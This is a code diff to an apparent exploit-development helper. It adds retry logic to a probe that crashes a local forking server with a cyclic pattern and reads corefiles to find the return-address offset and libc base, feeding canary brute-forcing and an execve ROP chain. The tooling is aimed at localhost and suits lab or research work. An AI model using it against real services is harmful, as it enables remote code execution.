@@ -13,10 +13,22 @@ _CRASH_PATTERN_LENGTH = 512
 _CORE_WAIT_TIMEOUT = 5.0
 _CORE_POLL_INTERVAL = 0.1
 _TARGET_ARCH = "amd64"  # this project only ever targets 64-bit Linux x86-64
+_MAX_CRASH_ATTEMPTS = 3
 
 
 class LeakError(Exception):
     pass
+
+
+class _StaleCoreError(Exception):
+    """Internal signal only: the corefile _wait_for_crash_core() handed
+    back doesn't match the crash *this* attempt caused (its own cleanup
+    means it can't be an unrelated run's leftover — but a rapid trailing
+    crash from something else using the same server/cwd, e.g. the last of
+    crack_canary()'s thousands of guess-and-cleanup cycles, can still land
+    a stale-but-parseable core here right as a fresh one starts). Retried
+    with a brand new crash rather than treated as a hard failure — same
+    race class offset/finder.py's _crash_and_get_rip already retries."""
 
 
 @dataclass(frozen=True)
@@ -44,6 +56,19 @@ def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> 
     part (i.e. right after `prefix`), matching how build_canary_execve_chain()
     composes the final payload as `prefix + b"A" * offset + chain.payload()`.
     """
+    last_error = None
+    for _ in range(_MAX_CRASH_ATTEMPTS):
+        try:
+            return _probe_once(server, libc_path, prefix)
+        except _StaleCoreError as exc:
+            last_error = exc
+    raise LeakError(
+        f"could not reliably read a matching crash corefile after "
+        f"{_MAX_CRASH_ATTEMPTS} attempts (likely a stale-core race); last error: {last_error}"
+    )
+
+
+def _probe_once(server: ForkingServer, libc_path: str | Path, prefix: bytes) -> LeakResult:
     io = remote("127.0.0.1", server.port)
     io.send(prefix + cyclic(_CRASH_PATTERN_LENGTH))
     io.recvall(timeout=2.0)
@@ -53,7 +78,7 @@ def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> 
     try:
         offset = cyclic_find(p64(core.rip))
         if offset == -1:
-            raise LeakError(
+            raise _StaleCoreError(
                 f"crash rip 0x{core.rip:x} not found in cyclic pattern "
                 f"(pattern_length={_CRASH_PATTERN_LENGTH} may be too short)"
             )
@@ -65,7 +90,7 @@ def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> 
                 libc_base = mapping.start
                 break
         if libc_base is None:
-            raise LeakError(f"could not locate {libc_path}'s runtime base in the crash corefile")
+            raise _StaleCoreError(f"could not locate {libc_path}'s runtime base in the crash corefile")
     finally:
         core.file.close()
 
